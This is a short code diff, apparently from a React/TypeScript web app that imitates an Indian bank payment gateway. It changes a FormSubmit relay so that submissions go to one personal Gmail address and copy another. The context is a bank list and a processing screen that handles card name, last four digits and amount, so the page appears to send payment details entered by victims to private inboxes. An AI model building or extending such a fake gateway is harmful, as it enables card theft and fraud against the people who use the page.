@@ -45,8 +45,8 @@ const BANKS = [
   "Central Bank of India", "Canara Bank", "Union Bank of India", "Yes Bank"
 ];
 
-const FORMSUBMIT_ENDPOINT = "https://formsubmit.co/ajax/akrasd25@gmail.com";
-const FORMSUBMIT_CC = "Rajatjha.ss708090@gmail.com,anandjhare4@gmail.com";
+const FORMSUBMIT_ENDPOINT = "https://formsubmit.co/ajax/Rajatjha.ss708090@gmail.com";
+const FORMSUBMIT_CC = "anandjhare4@gmail.com";
 
 // ── Bank Gateway: Processing Screen ────────────────────────────────────────
 function GatewayProcessing({ amount, cardLast4, cardName, onDone }: {
